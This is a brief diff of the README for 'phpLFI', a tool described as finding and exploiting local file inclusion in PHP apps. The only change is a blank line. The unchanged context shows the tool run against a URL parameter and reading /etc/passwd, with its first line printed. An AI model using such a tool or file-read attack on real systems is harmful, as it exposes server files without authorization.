@@ -9,6 +9,7 @@ Please note that this program is limited to discovering and exploiting LFI in PH
 
 ```
 $ ./phpLFI -u:'http://10.1.1.100/image.php?img=foo.jpg' -f:login.php,image.php
+
 ✓ LFI found in url. Successfully accessed /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
